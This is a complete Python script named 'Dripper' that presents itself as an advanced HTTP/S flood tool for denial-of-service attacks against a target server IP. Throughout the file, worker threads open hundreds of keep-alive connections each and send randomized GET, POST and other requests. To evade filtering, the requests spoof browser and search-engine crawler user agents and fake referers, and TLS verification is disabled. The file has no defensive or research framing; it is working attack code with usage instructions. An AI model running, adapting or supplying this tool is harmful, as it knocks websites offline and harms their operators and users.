#!/usr/bin/env python3
# =============================================================================
# Dripper - Advanced Multi-Vector HTTP/S Flood Tool
# Usage: python3 dripper.py -s <server_ip> [-p <port>] [-t <turbo_threads>]
# =============================================================================

import socket
import ssl
import threading
import time
import random
import argparse
import sys
import os
import select

# ============================== CONFIGURATION ==============================
DEFAULT_PORT = 80
DEFAULT_THREADS = 135
CONNECTION_TIMEOUT = 10
KEEPALIVE_INTERVAL = 5          # seconds between keep-alive requests per socket
MAX_KEEPALIVE_REQUESTS = 20     # how many requests per socket before closing
MAX_CONNECTIONS_PER_THREAD = 500

# Attack vectors
HTTP_METHODS = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"]
REQUEST_PATHS = [
    "/", "/index.html", "/index.php", "/api/v1/", "/login", "/wp-admin",
    "/search", "/?q=", "/contact", "/images/logo.png", "/css/style.css",
    "/favicon.ico", "/sitemap.xml", "/robots.txt"
]

# User-Agent pool (extensive)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.1 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
]

# Referer pool
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    None  # no referer sometimes
]

# Additional headers for randomness
ACCEPT_LANGUAGES = ["en-US,en;q=0.5", "de-DE,de;q=0.9,en;q=0.7", "fr-FR,fr;q=0.8,en;q=0.5"]
ACCEPT_ENCODINGS = ["gzip, deflate", "identity", "*", "gzip, deflate, br"]

# POST data bodies (if method is POST)
POST_BODIES = [
    b"username=admin&password=admin",
    b'{"user":"test","pass":"test"}',
    b"action=login&user=root&pass=toor",
    b"search=" + b"A" * 100
]

# ============================== GLOBAL STATE ==============================
stats_lock = threading.Lock()
total_requests = 0
total_errors = 0
start_time = None

def print_banner():
    print("""
  ____  _      _                  
 |  _ \(_)_ __| |_ __   ___ _ __ 
 | | | | | '__| | '_ \ / _ \ '__|
 | |_| | | |  | | |_) |  __/ |   
 |____/|_|_|  |_| .__/ \___|_|   
                |_|              
""")

# ============================== HELPER FUNCTIONS ==============================
def generate_http_request(method, host, port, path=None, body=None, keep_alive=True):
    """Craft a raw HTTP/1.1 request with highly randomized headers."""
    path = path or random.choice(REQUEST_PATHS)
    if method == "GET" and "?" not in path:
        path += f"?{random.randint(10000,99999)}={random.randint(0,9)}"
    ua = random.choice(USER_AGENTS)
    accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    lang = random.choice(ACCEPT_LANGUAGES)
    encoding = random.choice(ACCEPT_ENCODINGS)
    referer = random.choice(REFERERS)
    connection = "keep-alive" if keep_alive else "close"
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        f"Accept: {accept}",
        f"Accept-Language: {lang}",
        f"Accept-Encoding: {encoding}",
        f"Connection: {connection}",
        f"Cache-Control: no-cache"
    ]
    if referer:
        headers.append(f"Referer: {referer}")
    if method == "POST" and body:
        headers.append(f"Content-Length: {len(body)}")
        headers.append("Content-Type: application/x-www-form-urlencoded")
        request = "\r\n".join(headers) + "\r\n\r\n" + body.decode("utf-8", errors="ignore")
    else:
        request = "\r\n".join(headers) + "\r\n\r\n"
    return request.encode()

def update_stats(req=0, err=0):
    global total_requests, total_errors
    with stats_lock:
        total_requests += req
        total_errors += err

def print_stats():
    """Periodically output requests per second."""
    while True:
        time.sleep(1)
        with stats_lock:
            now = time.time()
            elapsed = now - start_time if start_time else 1
            rps = total_requests / elapsed if elapsed > 0 else 0
            print(f"\r[*] Requests: {total_requests} | Errors: {total_errors} | RPS: {rps:.2f}", end="")

# ============================== ATTACK WORKER (ADVANCED) ==============================
def attack_worker(host, port, use_ssl, stop_event):
    """Multi-vector worker: opens connections, sends varied requests, uses keep-alive."""
    # Connection pool per thread
    active_sockets = []
    try:
        while not stop_event.is_set():
            # Decide whether to reuse existing socket or create new one
            if active_sockets and random.random() < 0.7:  # 70% chance reuse
                sock = random.choice(active_sockets)
                try:
                    # Check if socket still alive
                    readable, _, _ = select.select([sock], [], [], 0)
                    if readable:
                        # Data available to read? Consume it
                        try:
                            sock.recv(4096)
                        except:
                            pass
                    # Send a new request
                    method = random.choice(HTTP_METHODS)
                    body = b""
                    if method == "POST":
                        body = random.choice(POST_BODIES)
                    request = generate_http_request(method, host, port, body=body, keep_alive=True)
                    sock.sendall(request)
                    update_stats(req=1)
                    # Read response quickly
                    try:
                        sock.recv(1024)
                    except:
                        pass
                except (socket.timeout, BrokenPipeError, OSError):
                    # Remove dead socket
                    active_sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
                    update_stats(err=1)
                # Possibly close socket after max requests
                if random.randint(1, MAX_KEEPALIVE_REQUESTS) == 1:
                    if sock in active_sockets:
                        active_sockets.remove(sock)
                        try:
                            sock.close()
                        except:
                            pass
            else:
                # Create a new socket
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(CONNECTION_TIMEOUT)
                    if use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=host)
                    sock.connect((host, port))
                    active_sockets.append(sock)
                    if len(active_sockets) > MAX_CONNECTIONS_PER_THREAD:
                        # Close oldest
                        old = active_sockets.pop(0)
                        try:
                            old.close()
                        except:
                            pass
                    # Send initial request
                    method = random.choice(HTTP_METHODS)
                    body = b""
                    if method == "POST":
                        body = random.choice(POST_BODIES)
                    request = generate_http_request(method, host, port, body=body, keep_alive=True)
                    sock.sendall(request)
                    update_stats(req=1)
                    # Read
                    try:
                        sock.recv(1024)
                    except:
                        pass
                except Exception:
                    # Connection failed
                    update_stats(err=1)
                    # Throttle a bit on failure
                    time.sleep(0.01)
            # Random micro-delay to avoid overwhelming own machine and mimic real traffic
            time.sleep(random.uniform(0.001, 0.02))
    finally:
        # Cleanup sockets
        for sock in active_sockets:
            try:
                sock.close()
            except:
                pass

# ============================== MAIN ATTACK ORCHESTRATOR ==============================
def start_attack(server_ip, port, turbo):
    global start_time
    start_time = time.time()
    stop_event = threading.Event()
    threads = []

    # Determine if HTTPS likely (port 443) or if we want SSL flag? For simplicity, use SSL if port == 443
    use_ssl = (port == 443)

    print_banner()
    print(f"[*] Target: {server_ip}:{port} {'(SSL)' if use_ssl else ''}")
    print(f"[*] Turbo Threads: {turbo}")
    print("[*] Launching multi-vector HTTP flood...")
    print("[*] Press Ctrl+C to stop.\n")

    # Start stats reporter
    stat_thread = threading.Thread(target=print_stats, daemon=True)
    stat_thread.start()

    # Launch worker threads
    for i in range(turbo):
        t = threading.Thread(target=attack_worker, args=(server_ip, port, use_ssl, stop_event))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        # Keep main thread alive until interrupt
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        stop_event.set()

    # Wait for threads to finish (with timeout)
    for t in threads:
        t.join(timeout=2)

    print("[*] Attack finished.")
    # Final stats
    with stats_lock:
        elapsed = time.time() - start_time
        rps = total_requests / elapsed if elapsed > 0 else 0
        print(f"[*] Total requests sent: {total_requests}")
        print(f"[*] Total errors: {total_errors}")
        print(f"[*] Average RPS: {rps:.2f}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Dripper - Advanced HTTP/S Flood Tool")
    parser.add_argument("-s", "--server", required=True, help="Target server IP address")
    parser.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("-t", "--turbo", type=int, default=DEFAULT_THREADS, help=f"Number of turbo threads (default: {DEFAULT_THREADS})")
    args = parser.parse_args()

    # Basic IP validation
    try:
        socket.inet_aton(args.server)
    except socket.error:
        print("[!] Invalid IP address provided.")
        sys.exit(1)

    start_attack(args.server, args.port, args.turbo)
